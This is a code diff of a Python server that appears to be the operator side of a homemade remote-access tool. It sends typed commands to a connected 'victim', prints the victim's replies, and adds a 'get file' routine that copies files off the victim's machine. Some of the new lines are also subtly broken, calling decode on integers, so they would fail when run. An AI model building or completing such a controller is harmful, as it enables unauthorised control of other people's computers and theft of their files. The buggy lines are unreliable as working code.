@@ -9,16 +9,20 @@ def server():
     client_socket, adress = s.accept()
     print("Connection from: " + str(adress))
     while True:
-        command = input('Please enter a command to the victim')
+        command = input('Please enter a command to the victim\n')
         client_socket.send(command.encode('utf-8'))
-        data = client_socket.recv(1024).decode('utf-8')
         if 'get file ' in command:
-            command = command.replace('get file ', '')
-            file_path = input("Where do you want to save the file")
-            with open(file_path, 'wb')as file:
-                file.writelines(data)
+            size = client_socket.recv((1024).decode('utf-8'))
+            print(size)
+            data_2 = client_socket.recv((size).decode('utf-8'))
+            file_path = input("Please enter the path of the file")
+            with open(file_path, 'wb')as f:
+                f.write(data_2)
 
-        print('From victim: ' + data)
+        else:
+            data = client_socket.recv(1024)
+            print('From victim: ' + data.decode('utf-8'))
+
     client_socket.close()
 
 
